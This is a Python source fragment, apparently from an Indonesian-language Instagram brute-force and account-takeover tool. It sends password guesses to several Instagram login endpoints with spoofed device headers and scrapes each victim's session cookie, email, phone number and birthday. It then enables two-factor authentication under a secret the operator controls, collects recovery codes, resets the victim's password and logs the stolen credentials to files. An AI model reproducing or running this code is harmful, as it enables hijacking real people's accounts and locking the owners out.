                       info_email     = ''
                       info_full_nama = ''
                       info_username  = users
                       info_nomor_hp  = ''
                       info_birthday  = ''
                    fbacc = self.Fafo(cookie)
                    akunfb = fbacc
                    if True in self.UbahData:
                       self.a2f = self.TahapPertama2f(cookie)
                       self.cex = 'A2F Di Aktifkan' if self.a2f['success-a2f'] is True else 'A2F Tidak Aktif'
                       self.aut = self.a2f['SecretKey']
                       self.pem = self.a2f['kode-pemulihan']
                       self.PWX = self.SandiBaru(cookie, pwb)
                       print(f'''\r                                                                     
 {P}status       : {H}Success Login
 {P}methode      : {H}Threads
 {P}username     : {H}{info_username}
 {P}password     : {H}{self.PWX}
 {P}nomor hp     : {H}{info_nomor_hp}
 {P}email        : {H}{info_email}
 {P}birthday     : {H}{info_birthday}
 {P}status a2f   : {H}{self.cex}
 {P}authentikasi : {H}{self.aut}
 {P}pemulihan    : {H}{self.pem}
 {P}profile data : {H}{info_followers}/{info_following}
 {P}Facebook acc : {akunfb}
 {P}cookie       : {H}{cookie}                                                   ''')
                    else:
                       print(f'''\r                                               
 {P}status       : {H}Success Login
 {P}methode      : {H}Threads
 {P}username     : {H}{info_username}
 {P}password     : {H}{pwb}
 {P}nomor hp     : {H}{info_nomor_hp}
 {P}email        : {H}{info_email}
 {P}birthday     : {H}{info_birthday}
 {P}Facebook acc : {akunfb}
 {P}profile data : {H}{info_followers}/{info_following}
 {P}cookie       : {H}{cookie}                                                   ''')
                       self.aut = None
                       self.pem = None
                       self.PWX = pwb
                    open('data/OK-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{info_username}|{self.PWX}|{info_followers}|{info_following}|{self.aut}|{self.pem}|{cookie}\n')
                    self.ResultSuccess +=1
                    break
               elif 'https://i.instagram.com/challenge' in str(_respon.text.replace('\\','')):
                    followers, following, postingan = self.friends_user_chek(users)
                    print(f'''\r                                                        
 {P}status       : {K2}Checkpoint
 {P}methode      : {K2}Threads
 {P}username     : {K2}{users}
 {P}password     : {K2}{pwb}
 {P}data profile : {K2}{followers}/{following}/{postingan}                                             ''')
                    open('data/CP-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{users}|{pwb}|{followers}/{following}/{postingan}\n')
                    self.ResultChechpoint +=1
                    break
           self.Loop +=1
           _status = '200'
           Console(style=temane[0]).print(f'└──[ code: {_status} logged: {self.ResultSuccess} challenge: {self.ResultChechpoint} hitung: {self.Loop} ]',end='\r')
    #    except Exception as e:print(e)
       except (AttributeError,requests.exceptions.ConnectionError):
          time.sleep(10)

   #-> LOGIN APK INSTAGRAM
   def Api(self, users, password):
       global file_ok
       ua = random.choice(ugenx)
       with requests.Session() as Client:
         try:
             for pwb in password:
                 Client.headers.update({**self.HeadersApiLogin(),
                      'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                      'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                      'x-ig-bandwidth-speed-kbps': '{}'.format(random.randint(100,999)),
                      'x-ig-bandwidth-totalbytes-b': str(random.randint(2000,5000)),
                      'x-ig-bandwidth-totaltime-ms': str(random.randint(500,4000)),
                      'x-ig-device-id': str(uuid.uuid4()),
                      'x-ig-android-id': 'android-%s'%(self.Android_ID(users,pwb).hexdigest()[:16]),
                      'x-ig-timezone-offset': str(self.timezone_offset()),
                      'x-ig-app-id': '567067343352427',
                      'user-agent': ua,
                 })
                 self.payloadIG = 'params={"client_input_params":{"device_id":"'+Client.headers['x-ig-android-id']+'","login_attempt_count":1,"secure_family_device_id":"","machine_id":"'+str(Client.headers['x-mid'])+'","accounts_list":[],"auth_secure_device_id":"","has_whatsapp_installed":0,"password":"#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+pwb+'","sso_token_map_json_string":"","family_device_id":"'+str(uuid.uuid4())+'","fb_ig_device_id":[],"device_emails":[],"try_num":1,"lois_settings":{"lois_token":"","lara_override":""},"event_flow":"login_manual","event_step":"home_page","headers_infra_flow_id":"","openid_tokens":{},"client_known_key_hash":"","contact_point":"'+users+'","encrypted_msisdn":""},"server_params":{"should_trigger_override_login_2fa_action":0,"is_from_logged_out":0,"username_text_input_id":"18g3p8:57","layered_homepage_experiment_group":null,"should_trigger_override_login_success_action":0,"device_id":null,"login_credential_type":"none","server_login_source":"login","waterfall_id":"'+str(uuid.uuid4())+'","login_source":"Login","INTERNAL__latency_qpl_instance_id":7465439600681,"reg_flow_source":"login_home_native_integration_point","is_caa_perf_enabled":1,"is_platform_login":0,"credential_type":"password","caller":"gslr","INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":null,"offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","password_text_input_id":"18g3p8:58","is_from_logged_in_switcher":0,"ar_event_source":"login_home_page"}}&bk_client_context={"bloks_version":"9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a","styles_id":"instagram"}&bloks_versioning_id=9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a'
                 Client.headers.update({'content-length':str(len(self.payloadIG))})
                 self.responsIG = Client.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=self.payloadIG, allow_redirects = True)
                 if 'logged_in_user' in self.responsIG.text.replace('\\',''):
                    self.Pepek = self.ChekDuplikat(users)
                    if self.Pepek is False:break
                    cokie = {}
                    try:
                        cok = re.search('"headers":"{"IG-Set-Authorization": "(.*?)"', str(self.responsIG.text.replace('\\',''))).group(1)
                        xyz = base64.b64decode(cok.split(':')[2]).decode()
                        ds_id = re.search('{"ds_user_id":"(\d+)"', str(xyz)).group(1)
                        sn_id = re.search('"sessionid":"(.*?)"', str(xyz)).group(1)
                        cokie.update({"ds_user_id":f"{ds_id}","sessionid":f"{sn_id}"})
                        cokie.update(self.responsIG.cookies.get_dict())
                    except: pass
                    cookie = self.Convert(cokie)
                    akun_info = self.friends_user(cookie)
                    if akun_info is not None:
                       info_email,info_full_nama,info_username,info_nomor_hp,info_birthday,info_followers,info_following = akun_info
                    else:
                       info_followers, info_following, none_postingan = self.friends_user_chek(users)
                       info_email     = ''
                       info_full_nama = ''
                       info_username  = users
                       info_nomor_hp  = ''
                       info_birthday  = ''
                    fbacc  = self.Fafo(cookie)
                    akunfb = fbacc
                    if True in self.UbahData:
                       self.a2f = self.TahapPertama2f(cookie)
                       self.cex = 'A2F Di Aktifkan' if self.a2f['success-a2f'] is True else 'A2F Tidak Aktif'
                       self.aut = self.a2f['SecretKey']
                       self.pem = self.a2f['kode-pemulihan']
                       self.PWX = self.SandiBaru(cookie, pwb)
                       print(f'''\r                                         
 {P}status       : {H}Success Login
 {P}methode      : {H}Instagram Manual
 {P}username     : {H}{info_username}
 {P}password     : {H}{self.PWX}
 {P}nomor hp     : {H}{info_nomor_hp}
 {P}email        : {H}{info_email}
 {P}birthday     : {H}{info_birthday}
 {P}status a2f   : {H}{self.cex}
 {P}authentikasi : {H}{self.aut}
 {P}pemulihan    : {H}{self.pem}
 {P}profile data : {H}{info_followers}/{info_following}
 {P}Facebook acc : {akunfb}
 {P}cookie       : {H}{cookie}                                                  ''')
                    else:
                       print(f'''\r                                                         
 {P}status       : {H}Success Login
 {P}methode      : {H}Instagram Manual
 {P}username     : {H}{info_username}
 {P}password     : {H}{pwb}
 {P}nomor hp     : {H}{info_nomor_hp}
 {P}email        : {H}{info_email}
 {P}birthday     : {H}{info_birthday}
 {P}Facebook acc : {akunfb}
 {P}profile data : {H}{info_followers}/{info_following}
 {P}cookie       : {H}{cookie}                                               ''')
                       self.aut = None
                       self.pem = None
                       self.PWX = pwb
                    open('data/OK-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{info_username}|{self.PWX}|{info_followers}|{info_following}|{self.aut}|{self.pem}|{cookie}\n')
                    self.ResultSuccess +=1
                    break
                 elif 'redirection_to_checkpoint' in self.responsIG.text.replace('\\',''):
                    followers, following, postingan = self.friends_user_chek(users)
                    print(f'''\r                                                         
 {P}status       : {K2}Checkpoint
 {P}methode      : {K2}Instagram Manual
 {P}username     : {K2}{users}
 {P}password     : {K2}{pwb}
 {P}data profile : {K2}{followers}/{following}/{postingan}                                          ''')
                    open('data/CP-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{users}|{pwb}|{followers}/{following}/{postingan}\n')
                    self.ResultChechpoint +=1
                    break
             self.Loop +=1
             try:
                 _status = _status
             except: _status = '200'
             Console(style=temane[0]).print(f'└──[ code: {_status} logged: {self.ResultSuccess} challenge: {self.ResultChechpoint} hitung: {self.Loop} ]',end='\r')
         except (AttributeError,requests.exceptions.ConnectionError):
             time.sleep(10)

   def SmartLockGoogle(self, users, password):
       global file_ok
       try:
           for pwb in password:
               session = requests.Session()
               session.headers.update({**self.HeadersApiLogin(),
                  'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                  'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                  'x-ig-bandwidth-speed-kbps': '{}'.format(random.randint(100,999)),
                  'x-ig-bandwidth-totalbytes-b': str(random.randint(500000,900000)),
                  'x-ig-bandwidth-totaltime-ms': str(random.randint(1000,9000)),
                  'x-ig-device-id': str(uuid.uuid4()),
                  'x-ig-family-device-id': str(uuid.uuid4()),
                  'x-ig-android-id': 'android-%s'%(self.Android_ID(users,pwb).hexdigest()[:16]),
                  'x-ig-timezone-offset': str(self.timezone_offset()),
                  'x-ig-app-id': '567067343352427',
                  'user-agent': self.AppUac(self.HeadersApiLogin()['x-bloks-version-id']),
               })

               self.SmartData = {
                  'params': '{"client_input_params":{"device_id":"'+ str(session.headers['x-ig-android-id']) +'","lois_settings":{"lois_token":"","lara_override":""},"name":"'+str(users)+'","machine_id":"'+str(session.headers['x-mid'])+'","profile_pic_url":null,"contact_point":"'+str(users)+'","encrypted_password":"#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pwb)+'"},"server_params":{"is_from_logged_out":0,"layered_homepage_experiment_group":null,"INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":"'+str(session.headers['x-ig-family-device-id'])+'","device_id":"'+str(session.headers['x-ig-device-id'])+'","offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","waterfall_id":"'+str(uuid.uuid4())+'","login_source":"Login","INTERNAL__latency_qpl_instance_id":73767726200338,"is_from_logged_in_switcher":0,"is_platform_login":0}}',
                  'bk_client_context': '{"bloks_version":"'+ str(session.headers['x-bloks-version-id']) +'","styles_id":"instagram"}',
                  'bloks_versioning_id': str(session.headers['x-bloks-version-id'])
               }
               self.Query = 'params=%s&bk_client_context=%s&bloks_versioning_id=%s'%(urllib.parse.quote(self.SmartData['params']), urllib.parse.quote(self.SmartData['bk_client_context']), self.SmartData['bloks_versioning_id'])
               session.headers.update({'content-length':str(len(self.Query))})
               _respon = session.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request/', data=self.SmartData, allow_redirects = True)
               if 'logged_in_user' in str(_respon.text.replace('\\','')):
                    self.Pepek = self.ChekDuplikat(users)
                    if self.Pepek is False:break
                    cokie = {}
                    try:
                        cok = re.search('"headers":"{"IG-Set-Authorization": "(.*?)"', str(_respon.text.replace('\\',''))).group(1)
                        xyz = base64.b64decode(cok.split(':')[2]).decode()
                        ds_id = re.search('{"ds_user_id":"(\d+)"', str(xyz)).group(1)
                        sn_id = re.search('"sessionid":"(.*?)"', str(xyz)).group(1)
                        cokie.update({"ds_user_id":f"{ds_id}","sessionid":f"{sn_id}"})
                        cokie.update(_respon.cookies.get_dict())
                    except: pass
                    cookie = self.Convert(cokie)
                    akun_info = self.friends_user(cookie)
                    if akun_info is not None:
                       info_email,info_full_nama,info_username,info_nomor_hp,info_birthday,info_followers,info_following = akun_info
                    else:
                       info_followers, info_following, none_postingan = self.friends_user_chek(users)
                       info_email     = ''
                       info_full_nama = ''
                       info_username  = users
                       info_nomor_hp  = ''
                       info_birthday  = ''

                    fbacc = self.Fafo(cookie)
                    akunfb = fbacc
                    if True in self.UbahData:
                       self.a2f = self.TahapPertama2f(cookie)
                       self.cex = 'A2F Di Aktifkan' if self.a2f['success-a2f'] is True else 'A2F Tidak Aktif'
                       self.aut = self.a2f['SecretKey']
                       self.pem = self.a2f['kode-pemulihan']
                       self.PWX = self.SandiBaru(cookie, pwb)
                       print(f'''\r                                                                     
 {P}status       : {H}Success Login
 {P}methode      : {H}SmartLock
 {P}username     : {H}{info_username}
 {P}password     : {H}{self.PWX}
 {P}nomor hp     : {H}{info_nomor_hp}
 {P}email        : {H}{info_email}
 {P}birthday     : {H}{info_birthday}
 {P}status a2f   : {H}{self.cex}
 {P}authentikasi : {H}{self.aut}
 {P}pemulihan    : {H}{self.pem}
 {P}profile data : {H}{info_followers}/{info_following}
 {P}Facebook acc : {akunfb}
 {P}cookie       : {H}{cookie}                                                             ''')

                    else:
                       print(f'''\r                                               
 {P}status       : {H}Success Login
 {P}methode      : {H}SmartLock
 {P}username     : {H}{info_username}
 {P}password     : {H}{pwb}
 {P}nomor hp     : {H}{info_nomor_hp}
 {P}email        : {H}{info_email}
 {P}birthday     : {H}{info_birthday}
 {P}Facebook acc : {akunfb}
 {P}profile data : {H}{info_followers}/{info_following}
 {P}cookie       : {H}{cookie}                                                  ''')
                       self.aut = None
                       self.pem = None
                       self.PWX = pwb
                    open('data/OK-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{info_username}|{self.PWX}|{info_followers}|{info_following}|{self.aut}|{self.pem}|{cookie}\n')
                    self.ResultSuccess +=1
                    break
               elif 'https://i.instagram.com/challenge' in str(_respon.text.replace('\\','')):
                    followers, following, postingan = self.friends_user_chek(users)
                    print(f'''\r                                                        
 {P}status       : {K2}Checkpoint
 {P}methode      : {K2}SmartLock
 {P}username     : {K2}{users}
 {P}password     : {K2}{pwb}
 {P}data profile : {K2}{followers}/{following}/{postingan}                             ''')
                    open('data/CP-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{users}|{pwb}|{followers}/{following}/{postingan}\n')
                    self.ResultChechpoint +=1
                    break
           self.Loop +=1
           _status = '200'
           Console(style=temane[0]).print(f'└──[ code: {_status} logged: {self.ResultSuccess} challenge: {self.ResultChechpoint} hitung: {self.Loop} ]',end='\r')
       except (AttributeError,requests.exceptions.ConnectionError):
          time.sleep(10)

   def data_graph(self, xxx):
       data = {
           'av': re.search('{"actorID":"(\d+)"', str(xxx)).group(1),
           '__d': 'www',
           '__user': '0',
           '__a':'1',
           '__req': 'h',
           '__hs': re.search('"haste_session":"(.*?)"', str(xxx)).group(1),
           'dpr': '2',
           '__ccg': 'GOOD',
           '__rev': re.search('{"consistency":{"rev":(\d+)}', str(xxx)).group(1),
           '__s': '',
           '__hsi': re.search('"hsi":"(\d+)"', str(xxx)).group(1),
           '__dyn': '',
           '__csr': '',
           '__comet_req': re.search('__comet_req=(\d+)', str(xxx)).group(1),
           'fb_dtsg': re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(xxx)).group(1),
           'jazoest': re.search('jazoest=(\d+)', str(xxx)).group(1),
           'lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),
           '__spin_r': re.search('"__spin_r":(\d+)', str(xxx)).group(1),
           '__spin_b': 'trunk',
           '__spin_t': re.search('"__spin_t":(\d+)', str(xxx)).group(1),
           'fb_api_caller_class': 'RelayModern',
           'fb_api_req_friendly_name': 'PolarisPostCommentsContainerQuery',
           'server_timestamps': 'true',
           'doc_id': '6888165191230459'
       }
       return(data)

   def headers_graph(self, xxx):
       headers = {
           'x-fb-friendly-name': 'PolarisPostCommentsContainerQuery',
           'x-ig-app-id': '1217981644879628',
           'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
           'content-type': 'application/x-www-form-urlencoded',
           'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),
           'accept': '*/*',
       }
       return(headers)

   def TahapPertama2f(self, cokie, url = 'https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point'):
       try:
           resp = requests.Session().get(url, cookies = {'cookie': cokie}).text
           head = self.headers_graph(resp)
           head.update({
               'Host': 'accountscenter.instagram.com',
               'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
               'x-fb-friendly-name': 'useFXSettingsTwoFactorGenerateTOTPKeyMutation',
               'content-type': 'application/x-www-form-urlencoded',
               'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(resp)).group(1),
               'x-ig-app-id': '1217981644879628',
           })
           data = self.data_graph(resp)
           data.update({
               'fb_api_caller_class':'RelayModern',
               'fb_api_req_friendly_name':'useFXSettingsTwoFactorGenerateTOTPKeyMutation',
               'variables':json.dumps({"input":{"client_mutation_id":f"{self.ClientId(resp)}","actor_id":f"{self.AccountId(resp)}","account_id":f"{self.AccountId(resp)}","account_type":"INSTAGRAM","device_id":"device_id_fetch_ig_did","fdid":"device_id_fetch_ig_did"}}),
               'doc_id':'6282672078501565',
           })
           get_p = requests.post('https://accountscenter.instagram.com/api/graphql/', data=data, headers=head, cookies = {'cookie':cokie}).text
           if "totp_key" in str(get_p):
              xnxx = re.search('"key_text":"(.*?)"', str(get_p)).group(1)
              hpsx = xnxx.replace(' ','')
              kode = requests.get(f'https://2fa.live/tok/{hpsx}').json()['token']
              self.info.update({'SecretKey':hpsx})
              self.AktifkanA2f(cokie, kode, resp, hpsx)
           else:
              self.info.update({'SecretKey':'Kode Authentikasi Tidak Ada'})
              self.info.update({'success-a2f':False})
              self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
       except Exception as e:
          self.info.update({'SecretKey':'Kode Authentikasi Tidak Ada'})
          self.info.update({'success-a2f':False})
          self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
       return self.info

   def AktifkanA2f(self, cokie, code, resp, auth):
       try:
           xxx, ua = resp, 'Instagram 163.0.0.45.122 Android (28/9; 440dpi; 1080x2130; Xiaomi/xiaomi; Redmi Note 8; ginkgo; qcom; ru_RU; 250742113)'
           head = self.headers_graph(resp)
           head.update({
              'Host': 'accountscenter.instagram.com',
              'x-ig-app-id': '1217981644879628',
              'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(resp)).group(1),
              'content-type': 'application/x-www-form-urlencoded',
              'user-agent': ua,
              'x-fb-friendly-name': 'useFXSettingsTwoFactorEnableTOTPMutation',
           })
           data = {'av':self.AccountId(resp),'__user':'0','__a':'1','__req':'14','__hs':re.search('"haste_session":"(.*?)"', str(xxx)).group(1),'dpr':'2','__ccg':'GOOD','__rev':re.search('{"rev":(.*?)}',str(xxx)).group(1),'__hsi':re.findall('"hsi":"(\d+)"',str(xxx))[0],'__comet_req':'24','fb_dtsg':re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(xxx)).group(1),'jazoest':re.findall('&jazoest=(\d+)',str(xxx))[0],'lsd':re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),'__spin_r':re.findall('"__spin_r":(\d+)', str(xxx))[0],'__spin_b':'trunk','__spin_t':re.findall('"__spin_t":(\d+)', str(xxx))[0],'fb_api_caller_class':'RelayModern','fb_api_req_friendly_name':'useFXSettingsTwoFactorEnableTOTPMutation','variables':json.dumps({"input":{"client_mutation_id":re.search('{"clientID":"(.*?)"}',str(resp)).group(1),"actor_id":re.findall('"actorID":"(\d+)"', str(resp))[0],"account_id":re.findall('"actorID":"(\d+)"', str(resp))[0],"account_type":"INSTAGRAM","verification_code":code,"device_id":"device_id_fetch_ig_did","fdid":"device_id_fetch_ig_did"}}),'server_timestamps':'true','doc_id':'7032881846733167'}
           ondw = requests.Session().post('https://accountscenter.instagram.com/api/graphql/', data=data, headers=head, cookies={'cookie':cokie}).text
           if '"success":true' in str(ondw):
              self.info.update({'success-a2f':True})
              reco = self.get_code(cokie, resp)
              if reco is not None:
                 try:
                     kode = reco['data']['xfb_two_factor_regenerate_recovery_codes']['recovery_codes']
                     self.info.update({'kode-pemulihan':kode})
                 except:
                     self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
              else:self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
           else:
              self.info.update({'success-a2f':False})
              self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
       except Exception as e:
          self.info.update({'success-a2f':False})
          self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak ada'})

   def AccountId(self, xxx):
       try:
           Userid = re.search('{"actorID":"(\d+)"', str(xxx)).group(1)
           return(Userid)
       except AttributeError:return('')
       except requests.exceptions.ConnectionError: time.sleep(5); self.AccountId(xxx)

   def ClientId(self, xxx):
       try:
           Clients = re.search('{"clientID":"(.*?)"}', str(xxx)).group(1)
           return Clients
       except AttributeError:return('')
       except requests.exceptions.ConnectionError: time.sleep(5); self.ClientId(xxx)

   def get_code(self, cokie, response):
       try:
           data = self.data_graph(response)
           clin = self.ClientId(response)
           user = data['av']
           data.update({'__req':'t','__s':'','__dyn':'','__csr':'','fb_api_req_friendly_name':'useFXSettingsTwoFactorRegenerateRecoveryCodesMutation','variables':'{"input":{"client_mutation_id":"'+clin+'","actor_id":"'+user+'","account_id":"'+user+'","account_type":"INSTAGRAM","fdid":"device_id_fetch_ig_did"}}','doc_id':'24010978991879298'})
           head = self.headers_graph(response)
           head.update({
               'Host': 'accountscenter.instagram.com',
               'sec-ch-ua': 'Not_A',
               'x-ig-app-id': '936619743392459',
               'sec-ch-ua-mobile': '?0',
               'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
               'viewport-width': '980',
               'x-fb-friendly-name': 'useFXSettingsTwoFactorFetchRecoveryCodesMutation',
               'x-fb-lsd': '7g42wKUg5uJbzrClbnTyuB',
               'content-type': 'application/x-www-form-urlencoded',
               'x-asbd-id': '129477',
               'dpr': '2',
               'sec-ch-ua-full-version-list': 'Not_A',
               'sec-ch-prefers-color-scheme': 'light',
               'sec-ch-ua-platform': 'Linux',
               'accept': '*/*',
               'origin': 'https://accountscenter.instagram.com',
               'sec-fetch-site': 'same-origin',
               'sec-fetch-mode': 'cors',
               'sec-fetch-dest': 'empty',
               'referer': 'https://accountscenter.instagram.com/password_and_security/two_factor/',
               'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',})
           reqs = requests.post('https://accountscenter.instagram.com/api/graphql/', cookies={'cookie':cokie}, data=data, headers=head).json()
           return reqs
       except Exception as e:
           return None

   def OverPower(self):
       while True:
         try:
             self.uid = str(uuid.uuid4())
             self.ps  = requests.get(zlib.decompress(KamuNya)).json()

             self.NazriDev.update({'data':self.ps['xyraacode']['MidConfig'],'curl':self.ps['CURLpost']['xyraacodeURL'],'meta':self.ps['Headers']['xyraacodeHEAD']})
             self.data = self.NazriDev['data']
             self.data.update({
                  'device_id':'android-%s'%(self.Android_ID('null','null').hexdigest()[:16]),
                  'custom_device_id':str(self.uid),
                }
             )
             self.meta = self.NazriDev['meta']
             self.meta.update({
                  'x-ig-device-id': str(self.uid),
                  'x-ig-android-id': str(self.data['device_id']),
                  'x-ig-timezone-offset': str(self.timezone_offset()),
                  'content-length': str(len(self.data))
                }
             )
             self.resp = requests.post(self.NazriDev['curl'], data=self.data, headers=self.meta)
             self.appc = self.resp.headers['ig-set-x-mid']
             if self.appc not in self.MID:
                if len(self.MID) <6:
                   self.MID.append(self.appc)
                else: break
         except: break

   def PasswordNEW(self):
       self.abd = ['ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz']
       self.san = ''.join(random.choice(random.choice(self.abd)) for _ in range(12))
       return(self.san)

   def SandiBaru(self, cookie, old_pw):
       try:
            resp = requests.get('https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point', cookies={'cookie':cookie}).text
            head = self.headers_graph(resp)
            head.update({'Host': 'accountscenter.instagram.com','x-fb-friendly-name': 'useFXSettingsChangePasswordMutation','user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',})
            data      = self.data_graph(resp)
            old_pwx   = "#PWD_BROWSER:0:{}:{}".format(int(time.time()),old_pw)
            self.sand = self.PasswordNEW()
            new_pw    = "#PWD_BROWSER:0:{}:{}".format(int(time.time()),self.sand)
            data.update({'fb_api_req_friendly_name': 'useFXSettingsChangePasswordMutation','variables': '{"account_id":"'+data['av']+'","account_type":"INSTAGRAM","current_password_enc":{"sensitive_string_value":"'+str(old_pwx)+'"},"new_password_enc":{"sensitive_string_value":"'+str(new_pw)+'"},"new_password_confirm_enc":{"sensitive_string_value":"'+str(new_pw)+'"},"client_mutation_id":"'+self.ClientId(resp)+'","should_logout":false}','doc_id': '6616377658461852',})
            respon = requests.post('https://accountscenter.instagram.com/api/graphql/', cookies={'cookie':cookie}, data=data, headers=head).text
            if '"success":true' in str(respon):return new_pw.split(':')[3]
            else:return old_pwx.split(':')[3]
       except:return old_pw
# MAIN().ApiThreads('iccanhtg', ['iccan12345'])
